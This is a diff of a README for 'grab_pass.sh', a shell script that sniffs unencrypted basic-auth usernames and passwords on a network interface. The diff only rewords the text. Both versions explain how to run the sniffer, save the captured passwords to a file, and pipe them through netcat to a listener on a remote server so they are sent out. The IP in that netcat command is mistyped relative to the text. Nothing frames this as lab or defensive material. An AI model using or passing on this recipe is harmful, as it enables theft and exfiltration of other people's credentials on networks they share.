@@ -1,15 +1,15 @@
 # grab_pass.sh
 
-This is a simple script that sniffs for unencrypted basic auth logins/passwords.  You can either just run it as is.  The only option is the ethernet device.  Example with eth0:
+This is a simple script that sniffs for unencrypted basic auth logins/passwords.  The only option is the ethernet device.  Example with eth0:
 
 `bash grab_pass.sh eth0`
 
 Now just sit back and wait.  
 
-If you are like me, you want to keep or send those passwords somewhere.  You can always tee it to a file:
+If you want to keep those passwords, you can always tee it to a file:
 
 `bash grab_pass.sh eth0 | tee logins.txt`
 
-or you could always setup netcat to listen on a server somewhere, then pipe the results to netcat.  For example, if I had a listener on 10.0.0.4 running on port 5555, I would just run this:
+Or you could always setup netcat to listen on a server somewhere, then pipe the results to netcat.  For example, if you had a listener on 10.0.0.4 running on port 5555, you could just run this:
 
 `bash grab_pass.sh eth0 | nc 10.0.0.0.4 5555`
